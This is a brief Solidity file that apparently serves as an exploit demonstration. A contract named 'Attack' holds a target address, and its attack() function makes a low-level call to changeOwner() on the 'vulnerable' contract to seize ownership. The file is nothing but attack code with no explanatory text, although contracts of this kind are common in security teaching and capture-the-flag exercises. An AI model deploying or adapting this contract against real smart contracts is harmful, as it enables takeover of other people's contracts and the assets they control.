// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Attack {
    address public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
    }

    function attack() public {
        vulnerableContract.call(abi.encodeWithSignature("changeOwner()"));
    }
}